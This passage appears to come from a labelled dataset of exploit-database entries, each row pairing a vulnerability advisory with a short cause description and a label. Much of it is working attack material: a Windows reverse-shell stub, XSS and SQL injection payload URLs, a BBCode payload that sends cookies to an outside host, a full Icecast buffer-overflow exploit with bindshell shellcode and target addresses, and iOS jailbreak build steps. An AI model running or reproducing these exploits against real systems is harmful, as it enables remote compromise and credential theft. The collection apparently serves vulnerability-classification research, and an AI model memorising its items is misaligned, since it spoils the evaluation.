PROCESS_INFORMATION pi;         struct sockaddr_in adik_sin;             memset(&adik_sin,0,sizeof(adik_sin));         memset(&si,0,sizeof(si));         WSAStartup(MAKEWORD(2,0),&wsaData);         hSocket = WSASocket(AF_INET,SOCK_STREAM,NULL,NULL,NULL,NULL);         adik_sin.sin_family = AF_INET;         adik_sin.sin_port = htons(PORT);         adik_sin.sin_addr.s_addr = inet_addr(""IP"");         connect(hSocket,(struct sockaddr*)&adik_sin,sizeof(adik_sin));         si.cb = sizeof(si);         si.dwFlags = STARTF_USESTDHANDLES;         si.hStdInput = si.hStdOutput = si.hStdError = (void *)hSocket;         CreateProcess(NULL,""cmd"",NULL,NULL,true,NULL,NULL,NULL,&si,&pi);                 ExitProcess(0);  } */",insufficient bounds checking on the USER parameter,1
25272,Dream4 Koobi CMS 4.2.3 - 'index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/12895/info  Koobi CMS is reportedly affected by a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/index.php?area=[XSS],a failure in the application to properly sanitize user-supplied input,1
38655,Corda .NET Redirector - 'redirector.corda' Cross-Site Scripting source: https://www.securityfocus.com/bid/61156/info  Corda .NET Redirector is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Corda .NET Redirector 7.3.11.6715 is vulnerable; other versions may also be affected.   http://www.example.com/Corda/redirector.corda/? () _FILEhttp://<URL>/?<script>alert('Text')</script><iframe src=http://www.example1.com></iframe>@_TEXTDESCRIPTIONEN,fails to properly sanitize user-supplied input,1
27532,"Joomla! Component redSHOP 1.2 - SQL Injection -------------------------------------------- Joomla! redSHOP component v1.2 SQL Injection --------------------------------------------  == Description == - Product: Joomla! redSHOP component - Product link: http://redcomponent.com/redcomponent/redshop - Vendor: redcomponent - Affected versions: version 1.2 is vulnerable. Other versions might be affected as well. - Vulnerability discovered by: Matias Fontanini  == Vulnerability == When using the ""addtocompare"" task, the component does not correctly sanitize the ""pid"" parameter before using it to construct SQL queries, making it vulnerable to SQL Injection attacks.  The following proof of concept request retrieves the database user, name and version:  http://example.com/index.php?tmpl=component&option=com_redshop&view=product&task=addtocompare&pid=24%22%20and%201=0%20union%20select%201,2,3,4,5,6,7,8,concat_ws%280x203a20,%20user%28%29,%20database%28%29,%20version%28%29%29,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63%23&cmd=add&cid=20&sid=0.6886686905513422  == Solution == Upgrade the product to the 1.3 version.  == Report timeline == [2013-08-02] Vulnerability reported to vendor. [2013-08-02] Developers answered back indicating that an update would be released soon. [2013-08-06] redSHOP 1.3 was released, which fixes the reported issue. [2013-08-08] Public disclosure.","the component does not correctly sanitize the ""pid"" parameter before using it to construct SQL queries",1
34370,"SAP NetWeaver 6.4/7.0 - 'wsnavigator' Cross-Site Scripting source: https://www.securityfocus.com/bid/41925/info  SAP Netweaver is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.  SAP Netweaver 6.4 through 7.0 is vulnerable; other versions may also be affected.  https://www.example.com/wsnavigator/jsps/explorer/help.jsp?title=Test"">AAAAAAAA<script>alert(&#039;XSS&#039;)</script>",fails to properly sanitize user-supplied input,1
23575,"Elite Bulletin Board 2.1.21 - Multiple SQL Injections Advisory ID: HTB23133 Product: Elite Bulletin Board Vendor: elite-board.us Vulnerable Version(s): 2.1.21 and probably prior Tested Version: 2.1.21 Vendor Notification: November 28, 2012  Vendor Patch: December 6, 2012  Public Disclosure: December 19, 2012  Vulnerability Type: SQL Injection [CWE-89] CVE Reference: CVE-2012-5874 CVSSv2 Base Score: 7.5 (AV:N/AC:L/Au:N/C:P/I:P/A:P) Solution Status: Fixed by Vendor Risk Level: High  Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ )   -----------------------------------------------------------------------------------------------  Advisory Details:  High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in Elite Bulletin Board, which can be exploited to perform SQL injection attacks.   1) Multiple SQL injection vulnerabilities in Elite Bulletin Board: CVE-2012-5874  The vulnerabilities exist due to insufficient sanitation of user-supplied data in URI in the ""update_whosonline_reg()"" and ""update_whosonline_guest()"" functions within the ""/includes/user_function.php"" script.   A remote attacker can send a specially crafted HTTP request to one of the following scripts and execute arbitrary SQL commands in application's database:  - checkuser.php - groups.php - index.php - login.php - quicklogin.php - register.php - Search.php - viewboard.php  - viewtopic.php  Successful exploitation of the vulnerabilities may allow attacker to extract sensitive data from the application's database, and even get complete control over the application under certain conditions (such as insecure configuration of database and web servers).  The following PoC (Proof of Concept) codes demonstrate the vulnerabilities by displaying version of the MySQL server:   http://[host]/checkuser.php/%27,%28%28select*from%28select%20name_const%28version%28%29,1%29,name_co nst%28version%28%29,1%29%29a%29%29%29%20--%20/  http://[host]/groups.php/%27,%28%28select*from%28select%20name_const%28version%28%29,1%29,name_const %28version%28%29,1%29%29a%29%29%29%20--%20/  http://[host]/index.php/%27,%28%28select*from%28select%20name_const%28version%28%29,1%29,name_const% 28version%28%29,1%29%29a%29%29%29%20--%20/  http://[host]/login.php/%27,%28%28select*from%28select%20name_const%28version%28%29,1%29,name_const% 28version%28%29,1%29%29a%29%29%29%20--%20/  http://[host]/quicklogin.php/%27,%28%28select*from%28select%20name_const%28version%28%29,1%29,name_c onst%28version%28%29,1%29%29a%29%29%29%20--%20/  http://[host]/register.php/%27,%28%28select*from%28select%20name_const%28version%28%29,1%29,name_con st%28version%28%29,1%29%29a%29%29%29%20--%20/  http://[host]/viewboard.php/%27,%28%28select*from%28select%20name_const%28version%28%29,1%29,name_co nst%28version%28%29,1%29%29a%29%29%29%20--%20/?bid=2  http://[host]/viewtopic.php/%27,%28%28select*from%28select%20name_const%28version%28%29,1%29,name_co nst%28version%28%29,1%29%29a%29%29%29%20--%20/?bid=2&tid=1   -----------------------------------------------------------------------------------------------  Solution:  Upgrade to Elite Bulletin Board v2.1.22  More Information: http://elite-board.us/Community/viewtopic.php?bid=1&tid=310 http://sourceforge.net/projects/elite-board/files/Elite%20Bulletin%20Board%20v2/2.1.22/  -----------------------------------------------------------------------------------------------  References:  [1] High-Tech Bridge Advisory HTB23133 - https://www.htbridge.com/advisory/HTB23133 - Multiple SQL Injection Vulnerabilities in Elite Bulletin Board. [2] Elite Bulletin Board - http://elite-board.us/ - Elite Bulletin Board is an advanced Bulletin Board program that provides advanced features such as CAPTCHA, sub-board, skinning ability, multilingual, commercial password encryption, and much more. [3] Common Vulnerabilities and Exposures (CVE) - http://cve.mitre.org/ - international in scope and free for public use, CVE® is a dictionary of publicly known information security vulnerabilities and exposures. [4] Common Weakness Enumeration (CWE) - http://cwe.mitre.org - targeted to developers and security practitioners, CWE is a formal list of software weakness types.   -----------------------------------------------------------------------------------------------  Disclaimer: The information provided in this Advisory is provided ""as is"" and without any warranty of any kind. Details of this Advisory may be updated in order to provide as accurate information as possible. The latest version of the Advisory is available on web page [1] in the References.",insufficient,0
21363,"Icecast 1.x - AVLLib Buffer Overflow // source: https://www.securityfocus.com/bid/4415/info  Icecast is a freely available, open source streaming audio server. Icecast is available for the Unix, Linux, and Microsoft Windows platforms.  Icecast does not properly check bounds on data sent from clients. Because of this, it is possible for a remote user to send an arbitrarily long string of data to the server, which could result in a stack overflow, and the execution of user supplied code. The code would be executed with the privileges of the Icecast server.   /*  all content is (c) #temp 2002 and may not be  *  (re)published in any form or (re)distributed   *  without written permission of the author (diz)   *  *   * 	icx.c -- icecast remote shell/root    *  *  * Found 15-02-2002...exploited 16-02-2002 ;P	  *  * Affected:  *  all versions up to 1.3.11 (current)   *   * the client_login() function is passed the full GET %s HTTP/1.0  * string provided by a mp3 client. Somewhere along the way an evil   * string function overflows buffer bounds with our humpage.. We can   * overflow just enough to reach and overwrite an instruction pointer.   * Humpage occurs somewhere in the handling of the request string  * between mount searching and request building...Havent been able  * to locate the exact spot as of yet (just discovered bug yesterday   * investigating another possible overflow in icecast extract_vars()   * funtion) Also some libavl routines look mighty guilty..especially   * avl_destroy. I cant really be bothered to check all entry points.   *  * This is why:  *  * root@blackout:/home/diz/audits/icecast-1.3.11/src > grep strcpy all.c | wc -w  *    284  * root@blackout:/home/diz/audits/icecast-1.3.11/src > grep sprintf all.c | wc -w  *    568  * root@blackout:/home/diz/audits/icecast-1.3.11/src > grep strcat all.c | wc -w  *     68  * root@blackout:/home/diz/audits/icecast-1.3.11/src >                      *  *  * A quick and dirty patch is to check and make sure the length of expr does not  * surpass 8000 bytes ala in client_login() in /src/client.c and recompile:  *   * // dirty fix  * if(strlen(expr) > 8000)   *	return;  * // end of dirty fix  *  * What can we do:  *  * We can either overwrite a framepointer and make the process pop an   * instruction pointer out of memory we control. Or overflow eip directly.   *   * We go for the direct eip hump(tm)  *  * For framepointer humpage:  *  * Finding the address to overflow ebp with to make esp  * point into the start of our buffer is easy..just gdb the  * target platform icecast binary and set a breakpoint in  * the client_login() function..output will be like this  *  * ...  *  Breakpoint 1, 0x804af49 in client_login (con=0x808d0f0, expr=0xbf3fdaf4  *  ""GET "", 'x' <repeats 196 times>...) at client.c:97  *  97      void client_login(connection_t *con, char *expr)  * ...  *  * expr is a pointer to our original string..so we know that  * is the start of our string in memory. Luck would have it we can just   * use that exact address and with pop incrementing it works out  * to be correct and point to the start of our eip bytes :)  * or into nops on a normal overflow. (which we will be doing)  *  * !!! Attention:  *  * When we just go for eip in one go we also need this address because  * icecast will only give us one go :( so we can't offset and brute it  * allthough we CAN pad with 7000+ nops..so finding a decent one go  * compromise shouldnt be that much of a problem :)  *  * 			diz - #temp  *  * special word to pip and blink for helping me gather expr addresses  *   * word to: eric, n0b0dy, muska, alcapone, sj, primalux, vonguard  * 		khromy, jesse666 and r0ss  *   * !!! A big ""we hope leprosy strikes thee down!"" to 2600.net !!!  *  * to compile standard overflow sploit: gcc icx.c -o icx   * to compile framepointer overflow sploit: gcc icx.c -o icx -DFPO  *  * note: for practical exploit usage just use standard mode  * framepointer bits are left in cuz Im toying with them  *  * 	this version is meant for linux x86 targets   *  *     PATCHES!?!?! WE DON'T NEED NO STINKIN PATCHES!!!  */  /*  root@blackout:/usr/local/icecast/bin > ./icecast Icecast Version 1.3.11 Initializing... Icecast comes with NO WARRANTY, to the extent permitted by law. You may redistribute copies of Icecast under the terms of the GNU General Public License. For more information about these matters, see the file named COPYING. Starting thread engine... [16/Feb/2002:15:39:33] Icecast Version 1.3.11 Starting.. [16/Feb/2002:15:39:33] Starting Admin Console Thread... -> [16/Feb/2002:15:39:33] Starting main connection handler... -> [16/Feb/2002:15:39:33] Listening on port 8000... -> [16/Feb/2002:15:39:33] Listening on port 8001... -> [16/Feb/2002:15:39:33] Using 'blackout' as servername... -> [16/Feb/2002:15:39:33] Server limits: 900 clients, 900 clients per  source, 10 sources, 5 admins -> [16/Feb/2002:15:39:33] WWW Admin interface accessible at  http://blackout:8000/admin -> [16/Feb/2002:15:39:33] Starting Calender Thread... -> [16/Feb/2002:15:39:33] Starting UDP handler thread... -> [16/Feb/2002:15:39:33] Starting relay connector thread... -> -> [16/Feb/2002:15:39:33] [Bandwidth: 0.000000MB/s] [Sources: 0]  [Clients: 0] [Admins: 1] [Uptime: 0 seconds] ->   // this was a target compiled from source on my machine  diz@blackout:~/code/dizcode > ./icx -h blackout -p 8000 -b 0xbf3fdaf4 -a 1  [ icx -- icecast humpage -- diz (#temp) ] ! resolving server: blackout ! compiled as standard overflow version ! using 0xbf3fdb58 as eip address ! sending string ! giving remote time to setup shop...zzz ! attempting to connect to bindshell ! connected to remote shell :) $ id uid=0(root) gid=0(root) groups=0(root),1(bin),14(uucp),15(shadow),16(dialout),17(audio),33(video),65534(nogroup) $ exit ! done diz@blackout:~/code/dizcode >   */  #include <stdio.h> #include <string.h> #include <unistd.h> #include <stdlib.h> #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h> #include <netdb.h> #include <errno.h>  #define ALLIGN	0 #define NOP	0x90  #define STRING 	""GET %s%s HTTP/1.0\n\n""   char allignbuf[4];  char outbuf[8206];  char nopbuf[512];   #ifdef FPO char humpbuf[8182]; // 8181 bytes to hit ebp #else char humpbuf[8186]; // 8185 bytes to overwrite ebp and eip ( minus 4 for BSD hosts) #endif  char code[] =  	// taeho oh bindshell code -- binds to port 30464 	""\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x43\xeb\x43\x5e\x31\xc0""   	""\x31\xdb\x89\xf1\xb0\x02\x89\x06\xb0\x01\x89\x46\x04\xb0\x06""   	""\x89\x46\x08\xb0\x66\xb3\x01\xcd\x80\x89\x06\xb0\x02\x66\x89""   	""\x46\x0c\xb0\x77\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x31""   	""\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0\x66\xb3\x02\xcd\x80""   	""\xeb\x04\xeb\x55\xeb\x5b\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04""   	""\xcd\x80\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xb3\x05\xcd""   	""\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80""   	""\xb0\x3f\xb1\x02\xcd\x80\xb8\x2f\x62\x69\x6e\x89\x06\xb8\x2f""   	""\x73\x68\x2f\x89\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89""   	""\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31""   	""\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x5b\xff\xff\xff"";   struct info { 	char *host; 	char *ip; 	int port; 	int allign; 	u_long address; } icx;  void type(int type); void handleshell(int sock);  int main(int argc, char **argv) { 	struct sockaddr_in slut; 	struct hostent *ip; 	int s, b, len = 0, i; 	u_int w[4], eip[4]; 	char *temp, c;	 	 	if(argc == 1) { 		fprintf(stderr, ""Usage: %s -h <host> -p <icecast port> [ -t <type> ] OR [ -a <allign>  -b <address of *expr> ]\n"", argv[0]); 		fprintf(stderr, ""\nTypes are (linux version):\n\n""); 		fprintf(stderr, ""------------------------------------------------\n""); 		fprintf(stderr, ""(1) SuSE 7.2 icecast 1.3.10 (rpm)\n""); 		fprintf(stderr, ""(2) debian 2.2.r2 sid icecast 1.3.11 (deb)\n""); 		fprintf(stderr, ""(3) slackware 8.0.0 (�tta) icecast 1.3.11 (tgz)\n""); 		fprintf(stderr, ""------------------------------------------------\n\n""); 		fprintf(stderr, ""[  read comments on how to aquire new targets  ]\n\n""); 		exit(1); 	} 	 	fprintf(stderr, ""[ icx -- icecast humpage -- diz (#temp) ]\n"");  	// default allign 	icx.allign = ALLIGN; 	 	 	while((c = getopt(argc, argv, ""h:p:a:b:t:"")) != EOF) { 		switch(c) { 			case 'h': 				icx.host = optarg; 				break; 			case 'p': 				icx.port = atoi(optarg); 				break; 			case 'b': 				sscanf(optarg, ""%p"", &temp); 				icx.address = (long)temp; 				break; 			case 'a': 				icx.allign = atoi(optarg); 				break; 			case 't': 				type(atoi(optarg)); 				break; 			default: 				fprintf(stderr, ""! huh ?\n""); 				exit(1); 		} 	} 	 	fprintf(stderr, ""! resolving server: %s\n"", icx.host);          if((ip = gethostbyname(icx.host)) == NULL) {                 perror(""! gethostbyname"");                 exit(1);         } 	 	icx.ip = (char *)inet_ntoa(*((struct in_addr *)ip->h_addr));	          s = socket(AF_INET, SOCK_STREAM, 0);         slut.sin_family = AF_INET;         slut.sin_port = htons(icx.port);         slut.sin_addr.s_addr = inet_addr(icx.ip);         memset(&(slut.sin_zero), '\0', 8);   	// setting overflow address  	#ifdef FPO  	icx.address += icx.allign;	 	 	#else 	 	icx.address += 100; // pointing into nops in *expr 	 	#endif   	#ifdef FPO 	 	fprintf(stderr, ""! compiled as frame pointer overflow version\n""); 	fprintf(stderr, ""! using 0x%lx as ebp address\n"", icx.address);  	#else 	 	fprintf(stderr, ""! compiled as standard overflow version\n"");	 	fprintf(stderr, ""! using 0x%lx as eip address\n"", icx.address); 	 	#endif  	 	// sort out overflow bytes 	w[0] = (icx.address & 0x000000ff);         w[1] = (icx.address & 0x0000ff00) >> 8;         w[2] = (icx.address & 0x00ff0000) >> 16;         w[3] = (icx.address & 0xff000000) >> 24; 	 	 	// setting the eip address make sure it points into nops 	// allthough there are no nops to point into yet..behe 	 	#ifdef FPO 	 	icx.address += (16 + icx.allign + 100); 	 	fprintf(stderr, ""! using 0x%lx as eip address\n"", icx.address); 	 	// sort out eip pop bytes 	eip[0] = (icx.address & 0x000000ff);         eip[1] = (icx.address & 0x0000ff00) >> 8;         eip[2] = (icx.address & 0x00ff0000) >> 16;         eip[3] = (icx.address & 0xff000000) >> 24; 	 	#endif  	// fill nop buffer         memset(&nopbuf, '\0', sizeof(nopbuf));         for(i = 0; i < sizeof(nopbuf); i++)                 nopbuf[i] = NOP;  	// allign 	memset(&allignbuf, '\0', sizeof(allignbuf)); 	for(i = 0; i < icx.allign && i < sizeof(allignbuf); i++)  		allignbuf[i] = 'x'; 	 	memset(&humpbuf, '\0', sizeof(humpbuf));	  	#ifdef FPO 	 	// place eip read bytes 4 times 	for(i = 0, b = 0; i < 16; i++, b++) { 		if(b == 4) b = 0; 		humpbuf[i] = (char)eip[b]; 	} 	 	// sprintf(&humpbuf[16], ""%s%s"", nopbuf, code); 	 	#else 	 	sprintf(&humpbuf[0], ""%s%s"", nopbuf, code); 	 	#endif 	 	// filling rest of string with garbage bytes 	// be sure to take the length of nops + shellcode 	// into account when the string contains them 	 	#ifdef FPO 	 	//! fp poop 	for(i = 16; i < (sizeof(humpbuf) - 1); i++) 		humpbuf[i] = 'x'; 	 	#else 	 	// take length off shellcode and nops into account when we have some 	for(i = (strlen(nopbuf) + strlen(code)); i < (sizeof(humpbuf) - 1); i++)                 humpbuf[i] = 'x'; 	 	#endif  	 	// making last 8 bytes overflow bytes (be it ebp..be it eip) 	humpbuf[sizeof(humpbuf) - 9] = (char)w[0];         humpbuf[sizeof(humpbuf) - 8] = (char)w[1];         humpbuf[sizeof(humpbuf) - 7] = (char)w[2];         humpbuf[sizeof(humpbuf) - 6] = (char)w[3];  	humpbuf[sizeof(humpbuf) - 5] = (char)w[0]; 	humpbuf[sizeof(humpbuf) - 4] = (char)w[1]; 	humpbuf[sizeof(humpbuf) - 3] = (char)w[2];	 	humpbuf[sizeof(humpbuf) - 2] = (char)w[3]; 	 	 	// connecting and going for the hump 	if(connect(s, (struct sockaddr *)&slut, sizeof(struct sockaddr)) == -1) { 		perror(""! connect""); 		exit(1); 	} 	else { 		memset(&outbuf, '\0', sizeof(outbuf));	 		snprintf(outbuf, sizeof(outbuf), STRING, allignbuf, humpbuf); 		 		#ifdef DEBUG 		for(i = 0; i < sizeof(outbuf); i++)  			fprintf(stderr, ""! byte %d [ 0x%x ]\n"", i, outbuf[i]); 		#endif 		 		do { 			fprintf(stderr, ""! sending string\n""); 			len += send(s, outbuf, strlen(outbuf), 0); 		} 		while(len < strlen(outbuf)); 		 		close(s); 	 		fprintf(stderr, ""! giving remote time to setup shop...zzz\n""); 		sleep(5);	 	 		fprintf(stderr, ""! attempting to connect to bindshell\n""); 		s = socket(AF_INET, SOCK_STREAM, 0); 		slut.sin_port = htons(30464); 		if(connect(s, (struct sockaddr *)&slut, sizeof(struct sockaddr)) == -1) {                 	perror(""! connect""); 			fprintf(stderr, ""! check 30464 with nc in case target was slow\n"");                 	exit(1); 		} 		else { 			fprintf(stderr, ""! connected to remote shell :)\n""); 			handleshell(s); 		}         } 		 	fprintf(stderr, ""! done\n""); 	exit(0); } 	 void type(int type) { 	// suse 7.2 1.3.10 (rpm) 	if(type == 1) { 		icx.address = 0xbf3fdaf4; 		icx.allign = 0; 		return; 	} 	 	// debian 2.2.r2 sid 1.3.11 (deb) 	if(type == 2) { 		icx.address = 0xbeffdaf4; 		icx.allign = 0; 		return; 	} 	 	// slackware 8.0.0 (�tta) 1.3.11 (tgz) 	if(type == 3) { 		icx.address = 0xbeffdaf4;                 icx.allign = 0;                 return; 	}  	fprintf(stderr, ""! type not found..exiting\n""); 	exit(1); }  		 void handleshell(int sock) {  	char inbuf[4096], outbuf[1024];  	fd_set fdset;  	fprintf(stderr, ""$ "");       	while(1) {         	 		FD_ZERO(&fdset);         	FD_SET(fileno(stdin), &fdset);         	FD_SET(sock, &fdset);  		select(sock + 1, &fdset, NULL, NULL, NULL);  		if(FD_ISSET(fileno(stdin), &fdset)) { 			memset(outbuf, '\0', sizeof(outbuf)); 			fgets(outbuf, sizeof(outbuf), stdin); 			if(strstr(outbuf, ""exit"") != NULL) { 				close(sock); 				return; 			} 			if(write(sock, outbuf, strlen(outbuf)) < 0) { 				fprintf(stderr, ""! write error\n""); 				return; 			} 		}  		if(FD_ISSET(sock, &fdset)) { 			memset(inbuf, '\0', sizeof(inbuf)); 			if(read(sock, inbuf, sizeof(inbuf)) < 0) { 				fprintf(stderr, ""! read error\n""); 				return; 			} 			fputs(inbuf, stderr); 			fprintf(stderr, ""$ ""); 		} 	} }",Icecast does not properly check bounds on data sent from clients,1
27585,PHPMyForum 4.0 - 'page' Cross-Site Scripting source: https://www.securityfocus.com/bid/17420/info  phpMyForum is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  phpMyForum 4.0 is reported prone to these issues. Other versions may be affected as well.  http://target/path/index.php?page=[xsscode]&type=text%2Fcss,a failure in the application to properly sanitize user-supplied input,1
30206,FuseTalk 4.0 - 'forum/include/common/comfinish.cfm?FTVAR_SCRIPTRUN' Cross-Site Scripting source: https://www.securityfocus.com/bid/24563/info  FuseTalk is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied input.  An attacker can exploit these issues to steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/forum/include/common/comfinish.cfm?FTRESULT.errorcode=0&FTVAR_SCRIPTRUN=[xss],the application fails to sufficiently sanitize user-supplied input,1
32454,"libxml2 - Denial of Service source: https://www.securityfocus.com/bid/31555/info  The libxml2 library is prone to a denial-of-service vulnerability caused by an error when handling files using entities in entity definitions.  An attacker can exploit this issue to cause the library to consume an excessive amount of memory, denying service to legitimate users.  The issue affects libxml2 2.7 prior to 2.7.2.   XML file:  <?xml version='1.0' ?> <!DOCTYPE test [ <!ENTITY ampproblem '&amp;'> ]> <t a=""&ampproblem;"">a</t>",an error when handling files using entities in entity definitions,1
27355,Woltlab Burning Board 2.3.4 - 'misc.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/16959/info  Woltlab Burning Board is prone to a cross-site scripting vulnerability. This issue is due to a lack of proper sanitization of user-supplied input.   An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. These may facilitate the theft of cookie-based authentication credentials as well as other attacks.  http://www.example.com/wbb/acp/misc.php?sid=yoursessionid&action=workingtop&taskname=Backup%20Database&percent=<script>aler(document.cookie)</script>,a lack of proper sanitization of user-supplied input,1
7145,"Exodus 0.10 - URI Handler Arbitrary Parameter Injection (1) -------------------------------------------------------------------------------- Exodus v0.10 uri handler arbitrary parameter injection by Nine:Situations:Group::strawdog tested against IE8b/xpsp3 may not work against non-English systems because of an installation bug -------------------------------------------------------------------------------- software site: http://code.google.com/p/exodus/ description: Exodus is a free software instant messaging client developed by Peter Millard and written in Borland Delphi that can connect to Jabber servers and exchange messages with other Jabber users. Currently, binaries are only available for Microsoft Windows. Exodus was designed as the official successor of the Winjab client, as Winjab was a personal project that was becoming too difficult to maintain[..] --------------------------------------------------------------------------------  reg key: HKEY_CLASSES_ROOT\im\shell\Open\command C:\Program Files\Exodus\Exodus.exe -u '%1' -------------------------------------------------------------------------------- it's possible to inject arbitrary command line parameters, ex. this shows the argument list: im:///'%20-?  this overwrites an arbitrary file: im:///'%20-l%20c:\boot.ini%20-v  now boot.ini looks like this: [2008-11-17 13.50.41.437]  Trying to setup the Auto Away timer. [2008-11-17 13.50.41.453]  Using Win32 API for Autoaway checks!! -------------------------------------------------------------------------------- todo: investigate this even: im:///'%20-c%20[A*300]  this will cause an infinite loop trough multiple unhandled exceptions and this: im:///'%20-c%20file:///aaaa%20 crash exodus.exe -------------------------------------------------------------------------------- our site ---------------------------------------> http://retrogod.altervista.org  # milw0rm.com [2008-11-17]",an installation bug Exodus is a free software instant messaging client,1
29378,AShop Deluxe 4.5 - 'basket.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/21845/info   AShop Deluxe and AShop Administration Panel are prone to multiple cross-site scripting vulnerabilities because they fail to sufficiently sanitize user-supplied input data.   An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   http://www.example.com/ashop/basket.php?cat=[XSS],fail to sufficiently sanitize user-supplied input data,1
25995,e107 Website System 0.6 - Nested BBCode URL Tag Script Injection source: https://www.securityfocus.com/bid/14301/info  e107 Website System is prone to a script injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   [color=#EFEFEF][url]www.ut[url=http://www.s=''style='font-size:0;color:#EFEFEF'style='top:expression(eval(this.sss));'sss=`i=new/**/Image();i.src='http://www.example.com/cgi-bin/shell.jpg?'+document.cookie;this.sss=null`style='font-size:0;][/url][/url]'[/color],a failure in the application to properly sanitize user-supplied input,1
23712,eCommerce Corporation Online Store Kit 3.0 - 'More.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/9676/info   Multiple vulnerabilities have been identified in the software due to improper sanitization of user-supplied input. Successful exploitation of these issues could allow an attacker to carry out cross-site scripting and SQL injection attacks via the 'id' parameter of 'more.php' script.   Online Store Kit version 3.0 has been reported to be prone to these issues.  more.php?id=%3Cscript%3Ealert(document.domain);%3C/script%3E&,improper sanitization of user-supplied input,1
40931,"Apple macOS 10.12 16A323 XNU Kernel / iOS 10.1.1 - 'set_dp_control_port' Lack of Locking Use-After-Free Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=965  set_dp_control_port is a MIG method on the host_priv_port so this bug is a root->kernel escalation.    kern_return_t   set_dp_control_port(     host_priv_t host_priv,     ipc_port_t  control_port)    {           if (host_priv == HOST_PRIV_NULL)                   return (KERN_INVALID_HOST);      if (IP_VALID(dynamic_pager_control_port))       ipc_port_release_send(dynamic_pager_control_port);      dynamic_pager_control_port = control_port;     return KERN_SUCCESS;   }  This should be an atomic operation; there's no locking so two threads can race to see the same value for dynamic_pager_control_port and release two references when the kernel only holds one.  This PoC triggers the bug such that the first thread frees the port and the second uses it; a more sensible approach towards exploiting it would be to use this race to try to decrement the reference count of a port with two references to zero such that you end up with a dangling port pointer.  Tested on MacOS 10.12 16A323   ##############################################################################  /* ianbeer */  READ THIS FIRST: if you do not have an iPod touch 6g running 10.1.1 (14b100) or and iPad mini 2 running 10.1.1 (14b100) this project will not work out of the box(*)! You need to fix up a couple of offsets - see the section futher down ""Adding support for more devices""  (*) more precisely, I only have those devices and have only tested it on them. (*) 1b4150 will probably also work, I haven't tested it.  Contents:  1 - Build Instructions  2 - Adding support for other devices  3 - Notes on the bugs and exploits  *** (1) Build Instructions ***   * download and install Xcode 8.1 or higher   * download Jonathan Levin’s collection of arm64 iOS binaries:     + Follow the link for ""The 64-bit tgz pack"" here:       http://newosxbook.com/tools/iOSBinaries.html (you want iosbinpack64.tgz)     + extract it into the iosbinpack64 directory which is already in the mach_portal       source dir so that directly underneath iosbinpack64 you have the bin/, etc/, sbin/, usr/ directories       When you expand the iosbinpack64 directory in the xcode folder view you should see those folders   * open this .xcodeproj   * if you don't have an apple id make one now at https://appleid.apple.com   * if you don't have a developer signing certificate you can make a free one now in Xcode   * in Xcode go Xcode->Preference->Accounts and click the '+' in the lower left hand corner and add your apple id   * select your account then ""View Details"" and under signing identites click Create next to iOS Development   * connect your iDevice and click ""trust"" in the pop up on it   * wait for xcode to process symbol files for this device   * in the box to the right of the play and stop buttons in the top left corner of the xcode window select your iDevice   * in the left hand window pane select the mach_portal project and navigate to the General tab   * in the signing window select your personal team   * We now need to fix up a few things:   * go to Build Settings -> Packaging and give your project a new, unique bundle identifier     (eg change it from ""com.example.mach_portal"" to ""com.ios.test.account.mach_portal""      where ios.test.account is your apple id. (it doesn’t have to be your apple id, just a unique string))   * We also need to register a unique App Group:   * In the capabilities view scroll down to the App Groups section, remove the existing App Group (""group.mach_portal"")    and add a new unique one (eg ""group.ios.test.account.mach_portal"")   * open jailbreak.c and change the app_group variable to this new app group id.   * on the iDevice go to settings -> General -> Device Management and select your apple ID and click trust   * in xcode click view -> debug area -> activate console so you can see debugging output (there's no output on the iDevice screen at all, that's normal)   * make sure your iDevice and host are connected to the same wifi network and that network allows client to client connections. Note down the iDevice's ip address.   * click play to run the app on the iDevice. If it fails press and hold the power and home buttons to reset the device. If Xcode asks you to enable developer mode on this mac agree.   * if it succeeds you should see:     ""shell listening on port 4141""    printed to the debug consol   * the kernel exploit is only around 50% reliable (this can certainly be improved, read 